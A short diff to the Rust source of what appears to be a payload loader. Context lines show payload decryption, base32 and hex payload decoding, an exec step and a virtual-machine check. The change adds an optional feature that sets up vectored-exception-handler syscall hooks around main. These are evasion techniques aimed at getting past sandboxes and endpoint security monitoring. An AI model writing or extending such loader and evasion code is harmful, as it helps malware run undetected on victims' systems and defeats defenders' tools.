@@ -17,6 +17,9 @@ use decrypt::decrypt;
 use exec::exec;
 use std::process;
 
+#[cfg(feature = "veh_syscall")]
+use rust_veh_syscalls::{initialize_hooks, destroy_hooks};
+
 #[cfg(feature = "base32_decode")]
 #[allow(dead_code)]
 fn base32_decode_payload(data: &[u8]) -> Option<Vec<u8>> {
@@ -46,6 +49,9 @@ fn hex_decode_payload(data: &[u8]) -> Option<Vec<u8>> {
 }
 
 fn main() {
+    #[cfg(feature = "veh_syscall")]
+    initialize_hooks();
+
     #[cfg(feature = "sandbox")]
     guard::guard_vm();
 
@@ -118,4 +124,7 @@ fn main() {
         }
         
     }
+
+    #[cfg(feature = "veh_syscall")]
+    destroy_hooks();
 }
